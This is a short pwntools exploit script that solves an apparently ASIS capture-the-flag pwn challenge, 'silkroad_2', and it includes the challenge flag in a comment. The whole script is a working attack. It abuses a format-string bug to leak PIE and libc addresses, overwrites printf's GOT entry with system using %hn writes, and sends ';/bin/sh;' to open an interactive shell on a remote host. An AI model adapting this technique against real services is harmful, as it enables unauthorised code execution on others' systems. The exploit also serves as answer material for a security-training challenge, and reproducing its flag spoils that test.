from pwn import *

#ASIS{Pl3a5e_Ch47_wItH_Dr3aD_P1Rat3_R0b3r75__}

#r = process('./silkroad_2.elf', env={'LD_PRELOAD': './libc6_2.27-3ubuntu1_amd64.so'})
r = remote('82.196.10.106', 47299)

r.sendafter(': ', '98831114236\n')
r.sendafter('>> ', '1\n')

def fmt(s):
	r.sendafter('admin: ', '\\' + s + '\n') 

fmt('%6$p')

r.recvuntil('0x')

pie = int(r.recvuntil('\n').split('\n')[0], 16) - 0x11d0

log.success('PIE @ ' + hex(pie))

o = 14

fmt(('%' + str(o + 1) + '$s').ljust(8 - 1, 'A') + p64(pie + 0x4f30))

r.recvuntil('cmd is invalid: \\')

libc = u64(r.recv(6).ljust(8, '\x00')) - 0x809c0

log.success('Libc @ ' + hex(libc))

printfgot = pie + 0x4f50
system = libc + 0x4f440

write1 = system & 0xffff
write2 = (system >> 16) & 0xffff

pause()

if write2 > write1:
	print 'write2 > write1'
	fmt(('%' + str(write1 - 0x11) + 'c' + '%' + str(o + 64/8) + '$hn' + '%' + str(write2 - write1) + 'c' + '%' + str(o + 64/8 + 1) + '$hn').ljust(64 - 1, 'A') + p64(printfgot) + p64(printfgot + 2))
else:
	print 'write 1 > write2'
	fmt(('%' + str(write2 - 0x11) + 'c' + '%' + str(o + 64/8) + '$hn' + '%' + str(write1 - write2) + 'c' + '%' + str(o + 64/8 + 1) + '$hn').ljust(64 - 1, 'A') + p64(printfgot + 2) + p64(printfgot))

r.send('\\\\;/bin/sh;\n')

r.interactive()
